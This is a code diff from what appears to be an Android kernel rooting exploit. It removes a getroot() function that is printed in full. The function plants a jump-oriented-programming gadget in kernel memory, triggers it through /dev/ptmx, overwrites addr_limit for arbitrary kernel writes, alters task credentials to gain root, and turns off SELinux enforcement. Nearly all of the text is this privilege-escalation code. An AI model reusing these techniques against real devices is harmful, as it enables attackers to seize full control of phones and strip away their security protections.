@@ -2,17 +2,14 @@
 #include <pthread.h>
 #include <stdio.h>
 #include <stdlib.h>
-
+#include <unistd.h>
 #include <netinet/ip.h>
-
+#include <fcntl.h>
 #include <sys/mman.h>
 #include <sys/uio.h>
-
 #include <sys/resource.h>
 
 #include "getroot.h"
-#include "sidtab.h"
-#include "policydb.h"
 #include "offsets.h"
 #include "selinux.h"
 #include "policy.h"
@@ -330,51 +327,6 @@ end:
 	return ret;
 }
 #else
-int getroot(struct offsets* o)
-{
-	int ret = 1;
-	int dev;
-	unsigned long fp;
-	struct thread_info* ti;
-
-	printf("[+] Installing JOP\n");
-	if(write_at_address(o->check_flags, (long)o->joploc))
-		return 1;
-
-	sidtab = o->sidtab;
-	policydb = o->policydb;
-	preparejop(MMAP_START, o->jopret);
-	if((dev = open("/dev/ptmx", O_RDWR)) < 0)
-		return 1;
-
-	fp = (unsigned)fcntl(dev, F_SETFL, MMAP_START);
-	fp += KERNEL_START;
-	ti = get_thread_info(fp);
-
-	printf("[+] Patching addr_limit\n");
-	if(write_at_address(&ti->addr_limit, -1))
-		goto end;
-	printf("[+] Removing JOP\n");
-	if(writel_at_address_pipe(o->check_flags, 0))
-		goto end;
-
-	if((ret = modify_task_cred_uc(ti)))
-		goto end;
-
-	//Z5 has domain auto trans from init to init_shell (restricted) so disable selinux completely
-	{
-		int zero = 0;
-		if(o->selinux_enabled)
-			write_at_address_pipe(o->selinux_enabled, &zero, sizeof(zero));
-		if(o->selinux_enforcing)
-			write_at_address_pipe(o->selinux_enforcing, &zero, sizeof(zero));
-	}
-
-	ret = 0;
-end:
-	close(dev);
-	return ret;
-}
 
 int getroot2(struct offsets2* o)
 {
